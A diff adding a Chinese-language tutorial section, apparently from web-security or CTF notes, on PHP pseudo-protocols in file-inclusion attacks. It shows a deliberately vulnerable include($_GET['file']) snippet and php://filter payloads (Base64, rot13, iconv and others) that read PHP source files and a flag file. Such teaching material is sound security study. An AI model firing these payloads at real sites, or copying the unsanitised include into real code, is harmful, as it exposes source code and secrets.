@@ -148,3 +148,28 @@ if (isset($_GET['file'])) {
 ?>
 ```
 
+##### PHP常见伪协议
+
+PHP伪协议常用于扩展名受限的文件包含，如下面的代码
+
+```php
+<?php
+	include($_GET['file'].'.php');
+```
+
+为了获取php文件的源码，可以使用特殊的协议来读取，如php://filter/，用于在数据流打开时筛选过滤应用，通俗来讲就是把读取到文件的内容进行一些处理。输入以下payload，可以将api.php的内容Base64编码后输出，而不是进行执行。
+
+```
+file=php://filter/read=convert.base64-encode/resource=api.php
+```
+
+read后面表示的是要使用的过滤器，除了base64过滤器，还有其他的过滤器，例如
+
+```
+php://filter/string.toupper/resource=index.php
+php://filter/string.tolower/resource=index.php
+php://filter/read=string.rot13/resource=flag.txt
+php://filter/convert.iconv.utf-8.utf-7/resource=index.php
+```
+
+如果Base64被过滤了，只需要用其他协议打乱文件中的PHP标签。因为PHP依据\<? php ?>标签决定是否解析，加入我们使用过滤器将PHP标签打乱，使其无法正常解析，其中的代码就会被当作字符串直接输出。
